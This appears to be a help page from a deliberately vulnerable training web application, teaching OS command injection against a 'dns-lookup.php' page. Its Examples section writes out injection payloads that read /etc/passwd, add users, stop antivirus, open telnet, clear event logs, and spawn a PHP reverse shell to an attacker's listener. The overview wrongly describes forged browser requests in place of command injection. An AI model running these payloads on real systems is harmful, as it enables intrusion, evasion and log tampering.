<br/><br/>
<span class="report-header">Overview</span>
<br/><br/>
Command Injection may occcur when an attacker is able to run script
into a users browser. To forge a legitimate request, the script creates and
send the same parameters to the target website that would be sent if the user
had submitted the legitimate form themselves. The target website knows the
request has come from the users browser but cannot detect that the request was
created and sent by a malicious script running in the users browser. As far as
the target site can tell, the user submitted the request by using the web site
in the expected way.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
<br/><br/>
<span class="report-header">Discovery Methodology</span>
<br/><br/>
Look for pages that appear to execute system commands like ping, nslookup, traceroute or CGI scripts
<br/><br/>
Attempt to identify the operating system. For example HTTP Response vanity headers like
x-powered-by, Server, x-aspnet-version, etc. may infer operating system. Also look for clues
such as ASP.NET runs on Windows exclusively and IIS version is tied directly to
operating system version. Try to cause an error since error messages often contain hints
about the underlying operating system such as the direction of the file path separators.
<br/><br/>
Fuzz with command separators like ;, &amp; and &amp;&amp; depending on if
you are using Linux or Windows respectively.
<br/><br/>
Fuzz with characters reserved in operating system shells
<br/><br/>
/bin/bash:	! # $ % &amp; ' ( ) * + , - . / : ; &lt; = &gt; ? @ [ \ ] ^ _ { | } ~<br/>
cmd.exe: 	% ^ &amp; &lt; &gt; | ' ` , ; = ( ) ! ” [ ] . * ?
<br/><br/>
Also fuzz with non-alphanumeric ASCII characters and command injection values from Fuzz DB
<br/><br/>
Some vulnerable pages may not produce explicit output. Two methods may help detect
command injection vulnerabilities in these cases may be missing output or
time-delay inference
<br/><br/>
When fuzzing for command injection note when pages are missing output.
In some cases an error caused by fuzzing for command injection may interupt the normal flow of execution.
<br/>
<ul>
	<li>The site may suppress error messages resulting in neither normal output nor error output.<li/>
	<li>The site may only display information from standard output (stdout) but not from the standard error
	file handle (stderr)</li>
	<li>The injected value may halt execution of the shell command before the command can generate output</li>
	<li>Use differential analysys to detect differences between a baseline response and other responses</li>
</ul>
By causing the response time of the increase measurably it may be possible to detect command injection without visible output
Use time-delay inference comparing the average time of a normal response against an attacker chosen time delay.
If the site is delayed as expected command injection has likely taken place.
For example, if a page typically takes two second to load and an attacker injections a
command that takes 15 seconds to execute, a response time of 17 seconds implies a vulnerability
<br/><br/>
Time-delay inference should be attempted with commands most users are allowed to execute that
cause a predictable delay.
ping may work well due to running in one second increments and being executable by
users on Windows and Linux against the loopback interface
<br/><br/>
Windows:	ping -n 15 127.0.0.1<br/>
Linux:	ping -i 15 -c 2 127.0.0.1
<br/><br/>
Try prefixing and suffixing the injection with chaining characters ||, |, &amp;&amp;, &amp;, `, &lt;CRLF&gt;, &lt;LF&gt;
<br/><br/>
Look for errors
that are related to operating system errors, delays in responses
which can be repeated by repeating the injection, or unexpected
output in the response. The error may appear as an HTML comment.
<br/><br/>
Attempt to determine the operating system type.
<br/><br/>
<span class="label">Reserved characters used in fuzzing for command injection</span>
<br/><br/>
<span class="label">&amp;</span>: Used to separate multiple commands on one command line.
Runs the first command then the second command.
<br/><br/>
<span class="label">&amp;&amp;</span>: Used to run the command following &amp;&amp; only if the
preceding command is successful.
<br/><br/>
<span class="label">|| (Windows)</span>: Used to run the command following || only if the preceding command fails.
Runs the first command then runs the second command only if the
first command did not complete successfully.
<br/><br/>
<span class="label">|| (Linux)</span>: Redirects standard output of the first command to standard input
of the second command.
<br/><br/>
<span class="label">( )</span>: Use to nest commands.
<br/><br/>
<span class="label">#</span>: Command line comment symbol
<br/><br/>
<span class="report-header">Exploitation</span>
<br/><br/>
Inject operating system commands methodically. "ls" and "dir" are reasonably
good commands to attempt since most user accounts will have permission to
execute directory listings by default and these two commands tend to
be exclusive (Windows will not typically execute "ls" and Linux will typically
not execute "dir" but this behavior absolutely varies)
<br/><br/>
Prefix the injections with each of the reserved characters then for each prefix
suffix each injection as well.
<br/><br/>
<span class="report-header">Examples</span>
<br/><br/>
Examples for page "dns-lookup.php"
<br/><br/>
<span style="white-space: pre;">
Recon: Discover available functionality using provided help

	Windows XP: &amp;&amp; help
	Linux: &amp;&amp; &lt;cmd&gt; --help
	Linux: &amp;&amp; man &lt;cmd&gt;

Recon: Determine current directory

	Windows XP: &amp;&amp; dir
	Linux: &amp;&amp; pwd

Recon: Chain commands to discover driectory structure

	Windows XP: &amp;&amp; cd ../../.. &amp;&amp; dir
	Linux: &amp;&amp; cd ../../.. &amp;&amp; ls -l

Scanning: Get machine network settings, hostname, DNS servers, subnet mask, etc.

	Windows XP: &amp;&amp; ipconfig /all
	Linux: &amp;&amp; ifconfig

Scanning: Discover hosts on network

	Windows XP: &amp;&amp; ping -n 1 192.168.56.102
	Linux: &amp;&amp; ping -c 1 192.168.56.102

Scanning: Enumerate Current user

	Windows XP: &amp;&amp; set
	Linux: &amp;&amp; whoami

Scanning: Enumerate users

	Linux: &amp; cat /etc/passwd

Scanning: Enumerate computers, users, groups, AD computers, AD users, AD groups

	Windows XP: &amp;&amp; net view [/domain]
	Windows XP: &amp;&amp; net user [/domain]
	Windows XP: &amp;&amp; net localgroup [/domain]

Gaining Access: Add user

	Windows XP: &amp;&amp; net user &lt;username&gt; /add
	Linux: useradd &lt;username&gt;

Gaining Access: Delete user

	Windows XP: &amp;&amp; net user &lt;username&gt; /delete

Gaining Access: Reverse Bash Shell

	Linux:
	Determine the IP address of the attacking host.
	Set up listener on attacker host such as nc -l -p 1234.
	Once listener set-up, ask web application server to connect back to attacker host.
	Set IP address appropriately.

	www.google.com;php -r '$sock=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;port&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'

Maintain Access: kill AV

	net stop &lt;av process&gt;

Maintain Access: Kill AV/protective services or open backdoor services
	Windows XP: &amp;&amp; net stop &lt;service name&gt;
	Windows XP: &amp;&amp; net start telnet
	Windows XP: &amp;&amp; net stop telnet

Cover Tracks: Clear logs

	Windows XP: &amp;&amp; wevtutil cl
		</span>
<br/><br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<br/><br/>